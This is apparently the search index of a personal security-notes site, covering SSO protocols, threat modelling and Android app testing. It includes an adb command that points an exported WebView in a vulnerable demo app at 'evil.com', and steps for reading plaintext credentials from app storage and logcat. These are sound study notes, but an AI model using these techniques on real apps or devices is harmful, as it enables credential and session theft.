{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Introduction","text":"<p>Ashok is an experienced Application Security Engineer with experience in penetration testing, application security, and secure cloud architecture. He has a strong background in building and leading proactive security programs for a variety of applications and cloud environments. His expertise lies in DAST, threat modeling, and red team simulation, with a focus on integrating security into the CI/CD pipeline and adhering to industry-standard frameworks like OWASP and NIST. He is a candidate for the Certified Ethical Hacker(CEH) from EC-Council, preparing for Offensive Security Certified Professional(OSCP) from Offensive Security certification, demonstrating his practical, hands-on skills in ethical hacking.</p>"},{"location":"#skill-set-and-certifications","title":"Skill Set and Certifications","text":"<ul> <li>Ashok possesses a comprehensive set of skills across multiple domains of cybersecurity.</li> </ul>"},{"location":"#technical-skills","title":"Technical Skills","text":"<ul> <li> <p>Security Operations: IAM, Threat Hunting, Incident Response, SIEM (Splunk), EDR, DLP, SAST, Vulnerability Management.</p> </li> <li> <p>Penetration Testing: Web/API/Mobile VAPT, Internal/External VAPT, Active Directory Exploitation, and identifying vulnerabilities like SSRF, IDOR, XSS, and SQLi.</p> </li> <li> <p>DevSecOps Tools: Proficient with GitHub Actions, Jenkins, SonarQube, Snyk, OWASP ZAP, and various security tools like TruffleHog and Crowdstrike.</p> </li> <li> <p>Cloud &amp; Network Security: Extensive experience with AWS services (IAM, S3, KMS, WAF), as well as network security tools like VPNs, Firewalls, and IDS/IPS. He also works with Infrastructure as Code tools like Terraform and containerization with Docker and Kubernetes.</p> </li> <li> <p>Programming/Scripting: Strong command of Python, Bash, PowerShell, and JavaScript, among others, for automation and security tasks.</p> </li> </ul>"},{"location":"#certifications","title":"Certifications","text":"<ul> <li>Certified Ethical Hacker (CEH): A testament to his foundational knowledge in ethical hacking.</li> <li>OSCP: Currently in progress, this certification validates his practical skills in penetration testing.</li> <li>Medal of Excellence: Awarded for being a top performer in secure platform design, reflecting his practical achievements.</li> </ul>"},{"location":"#career-summary","title":"Career Summary","text":"<ul> <li> <p>Ashok\u2019s career trajectory highlights his progressive experience from software development to specialized security roles. He has consistently applied secure coding practices aligned with industry benchmarks like OWASP and NIST. His experience includes:</p> </li> <li> <p>Security Engineering: Developing M&amp;A security onboarding pipelines, executing DAST scans, conducting threat modeling, and building CI/CD-integrated security controls.</p> </li> <li>Research &amp; Analysis: As a Research Assistant, he conducted threat modeling on IoT networks and participated in VAPT for healthcare cloud applications, contributing to compliance and vulnerability remediation.</li> <li>Penetration Testing: He has performed over 80 internal/external VAPT engagements on various platforms, achieving high fix rates and delivering actionable remediation to development teams.</li> <li>Software Development: In a prior role, he led the development of secure applications, focusing on data protection, applying secure coding from the planning phase, and aligning architecture with security standards.</li> </ul>"},{"location":"Formats/","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"Formats/#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"Formats/#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre> <p>I like to drink :beer: after i palyer :soccer:</p> <p>An Example code of code block</p> code-examples.md<pre><code>// Function to concatenate two strings\nfunction concatenateStrings(str1, str2) {\n  return str1 + str2;\n}\n\n// Example usage\nconst result = concatenateStrings(\"Hello, \", \"World!\");\nconsole.log(\"The concatenated string is:\", result);\n</code></pre>"},{"location":"Formats/#content-tabs","title":"Content Tabs","text":"<p>This is some examples of content tabs.</p>"},{"location":"Formats/#generic-content","title":"Generic Content","text":"Plain textUnordered listOrdered list <p>This is some plain text</p> <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> </ul> <ol> <li>First item</li> <li>Second item</li> <li>Third item</li> </ol>"},{"location":"Formats/#code-blocks-in-content-tabs","title":"Code Blocks in Content Tabs","text":"PythonJavaScript <pre><code>def main():\n    print(\"Hello world!\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <pre><code>function main() {\n    console.log(\"Hello world!\");\n}\n\nmain();\n</code></pre>"},{"location":"Formats/#types-of-text-boxes","title":"Types of text boxes","text":"<p>Title of the callout</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> Title of the callout <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p>"},{"location":"Formats/#diagram-examples","title":"Diagram Examples","text":""},{"location":"Formats/#flowcharts","title":"Flowcharts","text":"<pre><code>graph LR\n  A[Start] --&gt; B{Failure?};\n  B --&gt;|Yes| C[Investigate...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Success!];</code></pre>"},{"location":"Formats/#sequence-diagrams","title":"Sequence Diagrams","text":"<pre><code>sequenceDiagram\n  autonumber\n  Server-&gt;&gt;Terminal: Send request\n  loop Health\n      Terminal-&gt;&gt;Terminal: Check for health\n  end\n  Note right of Terminal: System online\n  Terminal--&gt;&gt;Server: Everything is OK\n  Terminal-&gt;&gt;Database: Request customer data\n  Database--&gt;&gt;Terminal: Customer data</code></pre>"},{"location":"OKTA/","title":"Okta","text":"<ul> <li> <p>Okta is a cloud-based Identity and Access Management (IAM) service. At its core, it acts as a central authority for all things related to identity, who a person is, what they have access to, and how they prove their identity. Okta's primary goal is to securely connect the right people to the right technologies at the right time.</p> </li> <li> <p>Problem Solves</p> <ul> <li>Single Sign-On(SSO): Once login with Okta able access all the organization apps easily with out passwords.</li> <li>MFA: Extra layer security for some sensitive applications</li> <li>Universal Directory: Sync with on-premises directories li AD, workday</li> <li>Lifecycle Management(LCM): Automates the process of creating, updating and deactivating user accounts.</li> </ul> </li> </ul>"},{"location":"OKTA/#common-authenication-mechanisms-supported-by-okta","title":"Common authenication mechanisms supported by Okta","text":"<ul> <li>For modern, custom-built applications, OIDC is the preferred standard due to its flexibility and ease of use with modern web and API development. For off-the-shelf enterprise applications, SAML is the most common and robust solution. SWA is a fallback option for legacy applications that cannot be integrated using a standard protocol.</li> </ul>"},{"location":"OKTA/#1-swa-secure-web-authentication","title":"1. SWA (Secure Web Authentication)","text":"<p>SWA is a simple, non-standard method developed by Okta. It is used for applications that do not support modern federation protocols like SAML or OIDC. It works by having Okta store the user's credentials(username and password) for the target.</p> <ul> <li>Example in a Software Company SWA:</li> <li>A small, internal tool built years ago for tracking server logs doesn't support modern SSO. The IT team wants to centralize access to it via Okta. They would set up an SWA integration.<ul> <li>Process: The Okta administrator enters the URL for the log viewer's login page into Okta. They can either set a shared username and password for everyone or allow each user to enter their own credentials once.</li> <li>User Experience: When a user clicks the log viewer icon on their Okta dashboard, the Okta browser plugin automatically fills in the login form, and the user is seamlessly logged in. This is a simple, but less secure and less scalable, form of SSO.</li> </ul> </li> <li>How it does the SWA autheication and process:<ol> <li>A user logs into their Okta dashboard.</li> <li>The user clicks on the tile for the SWA-enabled application.</li> <li>A special Okta browser plugin (required for SWA) intercepts this click.</li> <li>Okta securely retrives the user's encrypted credentials for that app from its secure store.</li> <li>The browser pluin then \"types\" the username and password into the application's login form and submits it, all without the user seeing credentials.</li> </ol> </li> </ul>"},{"location":"OKTA/#2-saml-security-assertion-markup-language","title":"2. SAML (Security Assertion Markup Language)","text":"<p>SAML is a widely adapted, XML-based open standard for exchanging authentication and authorization data between two parties: an Identity Provider (IdP) and a Service Provider (SP). In this model, Okta acts as the IdP, and the application you're integrating (e.g., Salesforce, Google Workplace) acts as the SP.</p> <ul> <li>Example in a Software Company SAML:</li> <li>The company uses Salesforce for its sales team. They want to enable SSO so users don't have to remember a separate Salesforce password.<ul> <li>Process: An Okta admin configures a SAML connection between Okta and Salesforce. They exchange metadata files that contain public certificates, endpoint URLs, and other configuration details.</li> <li>User Experience: When a sales representative navigates to <code>salesforce.com</code>, Salesforce immediately redirects them to the company's Okta login page. After they enter their Okta password and perhaps an MFA code, they are automatically redirected back to Salesforce and logged in. They never have to see or remember their Salesforce credentials.</li> </ul> </li> <li>How it does the SAML autheication and process:<ol> <li>User Access: A user tries to access a SAML-enabled application (the SP).</li> <li>Redirect to IdP: The SP recognizes that it's configured for SSO and redirects the user's browser to Okta (the IdP).</li> <li>Authentication with IdP: The user authenticates with Okta (if they havn't already in the current session). This is where Okta's robust security policies (MFA, adaptive access) are enforced.</li> <li>SAML Assertion: After successful authentication, Okta generates a digitally signed SAML assertion. This XML-based assertion contains information about the authenticated user, such as their username, email, and any other attributes required by the application.</li> <li>Redirect Back to SP: Okta sends the user's browser back to the SP, along with the signed SAML assertion.</li> <li>SP Validation and login: The SP receives the assertion, verifies its digital signature to ensure it came from a trusted source (Okta), and then uses the information inside to create a session for the user and grant them access.</li> </ol> </li> </ul>"},{"location":"OKTA/#3-oidc-openid-connect","title":"3. OIDC (OpenID Connect)","text":"<p>OIDC is a modern authentication layer built on top of the OAuth 2.0 authorization framework. While OAuth 2.0  is an authorization protocol (granting access to resources), OIDC adds an identity layer that allows an application to verify a user's identity and get basic profile information. It uses JSON Web Tokens (JWTs) as the standard token format, which are more lightweight and easier for web applications and APIs to work with then the XML used in SAML.</p> <ul> <li>Example in a Software Company OIDC</li> <li>A software company is building a new customer portal using a modern microservices architecture. They need a fast, secure way for customers to log in without storing their passwords.<ul> <li>Process: The developers use an Okta SDK to integrate the portal with Okta via OIDC. They register the application in Okta and get a <code>client_id</code> and <code>client_secret</code>.</li> <li>User Experience: A customer visits the portal and clicks \"Sign in.\" The portal redirects them to a customizable Okta-hosted login page. After they log in, Okta sends back a series of tokens. The portal uses these tokens to confirm the customer's identity and create their session. The portal can then use the access token to securely call other internal APIs on behalf of the user (e.g., an API that fetches their past orders).</li> </ul> </li> <li>How it does the OIDC autheication and process:<ol> <li>User Initiation: A user clicks a \"Login with Okta\" button on a modern web application (e.g., a Single-Page Application or mobile app).</li> <li>Authorization Request: The application (the \"client\") sends an authorization request to Okta's authorization server. This request includes a <code>client_id</code>, <code>redirect_uri</code>, and requested scopes (e.g., <code>openid</code>, <code>profile</code>, <code>email</code>) which specify the user information the app needs.</li> <li>User Authentication: Okta's authorization server handles user authentication.</li> <li>Token Exchange: After the user authenticates, Okta returns an authorization code to the client application. The client then exchanges this code for an ID Token (containing user identity information) and an Access Token (used to access APIs) from Okta's token endpoint.</li> <li>Session Creation: The application validates the tokens (the <code>ID Token</code> in particular) to confirm the user's identity and then create a secure session for them.</li> </ol> </li> </ul>"},{"location":"OKTA/#other-mechanisms","title":"Other Mechanisms","text":"<ul> <li>WS-Federation: A protocol similar to SAML, but primarily used for interoperability with Microsoft-based systems, such as Office 365 and SharePoint. It's less common for new integrations but still relevent for legacy Microsoft applications.</li> <li>OAuth 2.0: Not an authentication protocol on its own, but rather an authorization framework. It's designed to grant a third-party application limited access to a user's resources (e.g., a photo app getting access to your Google Photos) without ever seeing your password. Okta uses OAuth 2.0 externsively for API security, and ODIC is built on top of it to add the authentication piece.</li> </ul>"},{"location":"OKTA/#saml-integration","title":"SAML INtegration","text":"<ul> <li>Application-&gt; Browse App Catalog</li> </ul> <p>Salesforce developer -&gt; Search Single Sign On Enable SAML -&gt; Fill the NameIssuer</p>"},{"location":"OKTA/#questions","title":"Questions","text":"<ul> <li>Delegated Authentication</li> <li>Users comming from the AD provisioning in AD</li> <li>Okta users passwords must login with AD passwords</li> <li>Authenticators (Google, Okta)</li> <li>Salesforce provisioning to Okta </li> <li>Directory -&gt; Profile Editor</li> </ul>"},{"location":"Threat-Modelling/","title":"Threat Modelling","text":"<p>Threat Modeling is a structured process for identifying, analyzing, and mitigating potential threats to system and data. It's proctive approach that helps organizations understand vulnerabilities and prioritize security efforts to prevent attacks before they happen. Guide</p> <pre><code>graph LR\n  A[Scope] --&gt; B[Actors/Abusers?];\n  B --&gt; C[System Components,databases, mail server];\n  C --&gt; D[Process and data flows, cookies, tokens];\n  D ----&gt; E[Backups, monitoring, logging];</code></pre>"},{"location":"Threat-Modelling/#core-principles-of-effective-threat-modeling","title":"Core Principles of Effective Threat Modeling","text":"<ul> <li>Regardless of methodology, effective threat modeling adheres to several fundamental principles.<ul> <li>Systematic Approach: Following a structured process rather then ad-hoc security reviews.</li> <li>Attacker Perspective: Examining systems from an adversarial viewpoint.</li> <li>Risk-Based Prioritization: Focusing efforts on the most significant threats.</li> <li>Early Integration: Applying threat modeling during design rather then after implementation.</li> <li>Continous Refinement: Updating models as systems and threats evolve.</li> </ul> </li> </ul>"},{"location":"Threat-Modelling/#threat-modeling-process-framework","title":"Threat Modeling Process Framework","text":"<pre><code>graph LR\n  A[System Decomposition] --&gt; B[Threat Identification];\n  B --&gt; C[Mitigation Development];\n  C --&gt; |Validation| A</code></pre> <ol> <li>System Decomposition: Creating a comprehensive model of the system architecture, data flows, trust boundaries, and assets</li> <li>Threat Identification: Systematically identifying potential threats using structured methodologies</li> <li>Mitigation Development: Designing controls and countermeasures to address identified threats</li> <li>Validation: Verifying that mitigations effectively address the identified threats</li> </ol>"},{"location":"Threat-Modelling/#advanced-threat-modeling-methodologies","title":"Advanced Threat Modeling Methodologies","text":""},{"location":"Threat-Modelling/#stride-methodology-deep-dive","title":"STRIDE Methodology Deep Dive","text":"<ul> <li>Microsoft's STRIDE framework remains one of the most widely adopted threat modeling approaches, providing a mnemonic for six threat categories:</li> </ul> Threat Type Definition Example Attack Vectors Typical Security Properties Spoofing Impersonating something or someone else Session hijacking, phishing, IP spoofing Authentication Tampering Modifying data or code Parameter tampering, SQL injection, binary manipulation Integrity Repudiation Claiming to not have performed an action Disabling audit logs, log forgery, timestamp manipulation Non-repudiation Information Disclosure Exposing information to unauthorized individuals Path traversal, CSRF, unintended data leakage Confidentiality Denial of Service Degrading or blocking access to services Resource exhaustion, flooding attacks, deadlocks Availability Elevation of Privilege Gaining higher privileges than intended Vertical/horizontal privilege escalation, buffer overflows Authorization"},{"location":"Threat-Modelling/#dread-risk-assessment-model","title":"DREAD Risk Assessment Model","text":"<ul> <li> <p>DREAD provides a quantitative risk assessment framework by evaluating:</p> <ul> <li>Damage Potential: How severe is the damage if the vulnerability is exploited?</li> <li>Reproducibility: How easy is it to reproduce the attack?</li> <li>Exploitability: How much effort and expertise is needed to exploit the vulnerability?</li> <li>Affected Users: How many users would be affected by the exploit?</li> <li>Discoverability: How easy is it to discover the vulnerability?</li> </ul> </li> <li> <p>Each factor is typically rated on a scale of 1-10, and the final risk score is calculated as:</p> </li> </ul> <pre><code>Risk Score = (D + R + E + A + D) / 5\n</code></pre>"},{"location":"Threat-Modelling/#system-decomposition-techniques","title":"System Decomposition Techniques","text":""},{"location":"Threat-Modelling/#data-flow-diagrams-dfds-for-threat-modeling","title":"Data Flow Diagrams (DFDs) for Threat Modeling","text":"<p>Data Flow Diagrams provide a visual representation of how information moves through a system:</p> <pre><code>graph LR\n  A[Web Browser] --&gt; B{Web Server };\n  B --&gt; C[Application Server];\n  C --&gt; D[Database Server];\n  C --&gt; E[Payment Gateway];</code></pre> <ul> <li>For threat modeling, standard DFDs are enhanced with:<ul> <li>Trust Boundaries: Lines or containers indicating where trust levels change</li> <li>Data Classifications: Indicators of the sensitivity level of data in each flow</li> <li>Authentication Points: Markers for where authentication occurs</li> </ul> </li> </ul>"},{"location":"Threat-Modelling/#trust-boundary-identification-and-analysis","title":"Trust Boundary Identification and Analysis","text":"<ul> <li>Trust boundaries represent the points where data or control flow crosses between different trust levels. Key trust boundaries include:<ul> <li>Process Boundaries: Between different software processes</li> <li>Network Boundaries: Between network segments (e.g., internet to DMZ)</li> <li>Physical Boundaries: Between physical locations</li> <li>Trust Level Boundaries: Between security contexts (e.g., authenticated vs. unauthenticated)</li> </ul> </li> </ul>"},{"location":"Threat-Modelling/#attack-tree","title":"Attack Tree","text":"<ul> <li>Attack trees are a visual representation of a potential attack scenario. The tree has a root (the goal of the attack) and branches (the steps to achieve the goal). By breaking down an attack into smaller steps, organizations can better understand the attacker\u2019s motivations and identify vulnerabilities in their defenses. The attack tree can be used to prioritize risks and identify potential security controls to mitigate them.</li> </ul> <pre><code>Root Goal: Obtain Administrative Access to Financial Database\n|\n\u251c\u2500\u2500 Attack Vector 1: SQL Injection\n\u2502 \u251c\u2500\u2500 Discover vulnerable parameter (AND)\n\u2502 \u251c\u2500\u2500 Craft malicious payload (AND)\n\u2502 \u251c\u2500\u2500 Execute injection attack (AND)\n\u2502 \u251c\u2500\u2500 Escalate to system commands (AND)\n\u2502 \u2514\u2500\u2500 Create backdoor account\n\u2502\n\u251c\u2500\u2500 Attack Vector 2: Credential Theft\n\u2502 \u251c\u2500\u2500 Target Database Administrator\n\u2502 \u2502 \u251c\u2500\u2500 Phishing attack (OR)\n\u2502 \u2502 \u251c\u2500\u2500 Malware deployment (OR)\n\u2502 \u2502 \u2514\u2500\u2500 Social engineering\n\u2502 \u2514\u2500\u2500 Use stolen credentials\n\u2502\n\u2514\u2500\u2500 Attack Vector 3: Exploit Unpatched Vulnerability\n    \u251c\u2500\u2500 Identify database version (AND)\n    \u251c\u2500\u2500 Research known vulnerabilities (AND)\n    \u251c\u2500\u2500 Develop/acquire exploit (AND)\n    \u2514\u2500\u2500 Execute exploit\n</code></pre>"},{"location":"MobileSec/Android/","title":"Android Security","text":"<ul> <li>Android, based on the <code>Linux kernel</code>, is a mobile operating system. Discovered by Android Inc., acquired by Google.</li> </ul>"},{"location":"MobileSec/Android/#android-architecture","title":"Android Architecture","text":"<ul> <li>Android is an open source, Linux-based software stack created for a wide array of devices and form factors. Credits </li> </ul>"},{"location":"MobileSec/Android/#linux-kernel","title":"Linux Kernel","text":"<ul> <li>The foundation for the Android platform is the Linux kernel, Android Runtime(ART) relies on the Linux kernel for underlying functionalities such as threading and low-level memory management.</li> <li>This kernel lets android take advatage of the key security features and lets device manufactures develop hardware drivers for a well-known kernel. </li> </ul>"},{"location":"MobileSec/Android/#hardware-abstraction-layer-hal","title":"Hardware abstraction layer (HAL)","text":"<ul> <li>The HAL provides standard interfaces that expose device specific modules including camera, Bluetooth, Sensor.</li> </ul>"},{"location":"MobileSec/Android/#android-runtime","title":"Android Runtime","text":"<pre><code>graph LR\n  A[.java file] --&gt; B{Java compiler?};\n  B --&gt; C[.class files];\n  C --&gt; D{dex compiler};\n  D --&gt; E[.dex files];</code></pre> <ul> <li>Core Libraries - are the tools and resources that the application code utilizes and the runtime environment provides.</li> <li>Android Runtime(ART) written to run multiple virtual machines on low-memory devices by executing Dalvik Executable format(DEX) files it specifically designed for android.<ul> <li>Ahead -of-time (AOT) and just-in-time (JIT) compilation<ul> <li>AOT (All code compiled together) compilation converts code into native machine code before an app runs, providing faster startup and execution.     </li> <li>JIT (Each code file code compiled seperatly, suitable local development) converts code to native machine code during runtime, which uses fewer resources upfront and allows for dynamic optimization based on usage.</li> </ul> </li> </ul> </li> <li>Optimized garbage collection (GC).</li> <li>On Android 9 (API level 28) and higher, conversion of an app package's DEX files to mapp package into a more compact representation. This change allows your app to start faster and consume less disk space and RAM.</li> </ul>"},{"location":"MobileSec/Android/#libraries","title":"Libraries","text":"<ul> <li>Many core Android system components and services, such as ART and HAL, are built from native code that requires native libraries written in C and C++.</li> <li>It has Weblit for browser application, Open GL add support for drawing and manupulating 2D and 3D graphics in your app.</li> </ul>"},{"location":"MobileSec/Android/#java-api-framework","title":"Java API Framework","text":"<ul> <li>View system you can use to build an app\u2019s UI, including lists, grids, text boxes, buttons, and even an embeddable web browser</li> <li>Resource manager, providing access to non-code resources such as localized strings, graphics, and layout files</li> <li>Notification manager that enables all apps to display custom alerts in the status bar</li> <li>Activity manager that manages the lifecycle of apps and provides a common navigation back stack</li> <li>Content providers that enable apps to access data from other apps, such as the Contacts app, or to share their own data</li> </ul>"},{"location":"MobileSec/Android/#system-apps","title":"System Apps","text":"<ul> <li>User apps including Phone, Email, Message, Camers</li> </ul>"},{"location":"MobileSec/Android/#androind-static-analysis","title":"Androind Static Analysis","text":"<ul> <li>Every app project must have an <code>AndroidManifest.xml</code> file, with precisely that name, at the root of the project source set. The manifest file describes essential information about your app to the Android build tools, the Android operating system, and Google Play.</li> <li>Android made up apk file, When you decompile the apk, you will get lot of files and folders. One of the file is <code>AndroidManifest.xml</code></li> <li><code>AndroidManifest.xml</code> stores permissions, package, version, SDK, Components of applications activity</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:versionCode=\"1\"\n    android:versionName=\"1.0\"&gt;\n\n    &lt;!-- Beware that these values are overridden by the build.gradle file --&gt;\n    &lt;uses-sdk android:minSdkVersion=\"15\" android:targetSdkVersion=\"26\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:label=\"@string/app_name\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/AppTheme\"&gt;\n\n        &lt;!-- This name is resolved to com.example.myapp.MainActivity\n             based on the namespace property in the build.gradle file --&gt;\n        &lt;activity android:name=\".MainActivity\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n\n        &lt;activity\n            android:name=\".DisplayMessageActivity\"\n            android:parentActivityName=\".MainActivity\" /&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> <ul> <li><code>Activity</code> represents single screen of the UI of the application(loginActivity, cartpage.java) </li> <li><code>Services</code> More long running process no need of UI interface, it's like spotify application audio playing in the backround.</li> <li><code>Broadcast Receviers</code> when charging cable connected notification, Got msg notification</li> <li><code>Content Provider</code> provides the interface of appls, gives space app data in locally or cloud.</li> <li><code>intents</code> used for communication between 2 components  <pre><code>&lt;!-- Explicit Intent Example: MyMainActivity is the entry point, typically launched explicitly --&gt;\n        &lt;activity android:name=\".MyMainActivity\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n\n&lt;!-- Implicit Intent Example: MyShareActivity can handle sharing text --&gt;\n        &lt;activity android:name=\".MyShareActivity\"\n            android:exported=\"true\"&gt; &lt;!-- Required for Android 12+ if intent-filter is present --&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.SEND\" /&gt;\n                &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n                &lt;data android:mimeType=\"text/plain\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n</code></pre><ul> <li><code>Explicit Intent</code> specifically mentioned towards the component</li> <li><code>Implicit Intent</code> not mentioned by us, however intent does contain other attributes which allow the android to figureout the correct intent.</li> </ul> </li> </ul> <p> - Match case  - intent filters not match Match case</p>"},{"location":"MobileSec/Android/#hacking-android-webviews","title":"Hacking Android WebViews","text":"<p>WebView is a system component and a special UI element that allows an app to display web content, such as web pages or web-based applications, directly within its own interface instead of opening a seperate browser app. </p> <ul> <li>Built on the Chromium engine, it acts as streamlined, in-app browser to render HTML, CSS and Javascript Demo Application Vulnwebview.</li> <li>WebViews are commonly used for tasks like displaying user agreements, in-app login pages, or links within socail media feeds, providing a more integrated and seamless user experience.</li> </ul>"},{"location":"MobileSec/Android/#webview-vulnerabilities-via-the-apps-code","title":"WebView Vulnerabilities via the app's code ?","text":"<ul> <li>If developer explicitly mentions <code>android:exported=true</code>, this parameter will taken adavatage by the third-pary applications sending intent this componet is exported third-paries has access to it. </li> </ul> <p>AndroidManifest.xml<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.tmh.vulnwebview\"&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n    &lt;application\n        &lt;activity android:name=\".SupportWebView\" android:exported=\"true\" /&gt;\n        &lt;activity android:name=\".RegistrationWebView\" android:exported=\"true\" /&gt;\n        &lt;activity android:name=\".MainActivity\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> - You can exploit this using the <code>adb shell</code> manually starting the activity. <pre><code># https://github.com/t4kemyh4nd/vulnwebview/blob/main/app/src/main/java/com/tmh/vulnwebview/RegistrationWebView.java, line 45 has reg_url\nadb shell am start -n com.tmh.vulnwebview.RegistrationWebView --es reg_url \"https://www.evil.com\"\n# --es extra string\n</code></pre> - Application code  RegistrationWebView.java<pre><code>package com.tmh.vulnwebview;\nimport android.os.Bundle;\nimport android.util.Log;\nimport android.webkit.ConsoleMessage;\nimport android.webkit.WebChromeClient;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class RegistrationWebView extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_registration_web_view);\n        setTitle(\"Registration page\");\n\n        loadWebView();\n    }\n\n    private void loadWebView() {\n        WebView webView = findViewById(R.id.webview);\n        webView.setWebChromeClient(new WebChromeClient() {\n            @Override\n            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {\n                Log.d(\"MyApplication\", consoleMessage.message() + \" -- From line \" +\n                        consoleMessage.lineNumber() + \" of \" + consoleMessage.sourceId());\n                return true;\n            }\n        });\n\n        webView.setWebViewClient(new WebViewClient());\n        //Allows cross-origin requests from file:// scheme to access content from any origin\n        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);\n\n        //Enabling javascript\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        if (getIntent().getExtras().getBoolean(\"is_reg\", false)) {\n            webView.loadUrl(\"file:///android_asset/registration.html\");\n        } else {\n            webView.loadUrl(getIntent().getStringExtra(\"reg_url\"));\n        }\n    }\n}\n</code></pre></p> <ul> <li>Scenarios<ul> <li>If an Authorization header is being sent while requesting the attacker-controlled domain.</li> <li>If the application loads URLs with HTTP</li> </ul> </li> <li><code>setAllowUniversalAccessFromFileURLs</code> sets whether cross-origin requests in the context of a file schema URL should be allowed to access content from any origin. This include access to content from other file scheme URLs or web contexts.</li> <li>The setting removes all the <code>same-origin</code> policy restrictions allow urls make requests from files.</li> <li><code>setJavaScriptEnabled</code> allow an attacker to carry out XSS, token stealing</li> </ul>"},{"location":"MobileSec/Android/#static-analysis","title":"Static Analysis","text":"<ul> <li>Static Analysis is all about decompiling and reverse engineering the APK file.</li> <li>Once decompiled or reverse engineered, we check out for certain specific file<ul> <li>AndroidManifest.xml</li> <li>Application is Debuggable</li> <li>Exported Activity is true</li> <li>Check for typographic errors in custom permissions</li> <li>Check for Exported Broadcast behaviour</li> <li>Check for Hardcoded API keys, Comments, Secrets, etc.</li> <li>Checking for Intents, etc.</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#mobsf-android","title":"MobSF Android","text":"<ul> <li>MobSF stands for Mobile Security Framework, It's an automated, all-in-one mobile application penetration framework.</li> <li>Helps to perform runtime assessment, Reports can be downloaded in PDF format, It's Open-source and clean to install.</li> <li>Bugbazaar Report</li> </ul>"},{"location":"MobileSec/Android/#static-analysis-tools","title":"Static analysis Tools","text":"<ul> <li> <p>CloudSEK BeVigil is a free mobile security tool, Offers services to recon mobile applications.</p> <ul> <li>Scan App is the feature which can scan applications and automatically find vulnerabilities.</li> <li>Credit-based system bevigil </li> </ul> </li> <li> <p>Yaazhini is a free user-friendly uulnerability scanner for Android APK and API that's exclusively designed and developed to identify APK and API level.</p> <ul> <li>Yaazhini has two vulnerability scanners are:</li> <li>Android Application APK vulnerability scanner</li> <li>Android Application REST API vulnerability scanner Here</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#shared-preferences-other-data-storage-options","title":"Shared Preferences &amp; Other Data Storage options","text":"<ul> <li>Shared Preferences are one of the databases where developers usually store application related data.<ul> <li>Most of the time this data is not encrypted and can be visible in plain text.</li> <li>There is a high possibility that the data consists of usernames and passwords</li> <li>Simply visit the location /data/data/package.name and view the contents of every file.</li> </ul> </li> <li>Data Storage text file, <code>.db</code> file obsrve the code file so that, you know where it is saving <code>sqlite3 &lt;table&gt;</code> then <code>.tables</code> view info <code>slect * from &lt;table_name&gt;</code></li> <li>ADB Logcat: Lgcat is a command-line tool that dumps a log of system messages when the device throws an error and sends messages that you have written from your app with the class.<ul> <li>Sometimes developers log errors, success messages, usernames, passwords which can be clearly visiable using logcat, command <code>adb logcat</code> you can filter some information <code>adb logcat | grep \"&lt;password&gt;\"</code></li> </ul> </li> <li>Pidcat: Pidcat is similar to Logcat except it only shows log entries for processes from a specific application package.<ul> <li>During application development you often want to only display log messages coming from your app, command <code>pidcat &lt;packagename&gt;</code></li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#hardcoded-credentials","title":"Hardcoded Credentials","text":"<ul> <li>Many developers hard coded credentials in the app, search for secret, crypt, private, token etc.</li> <li>Many apps use third party backend systems, analyse and 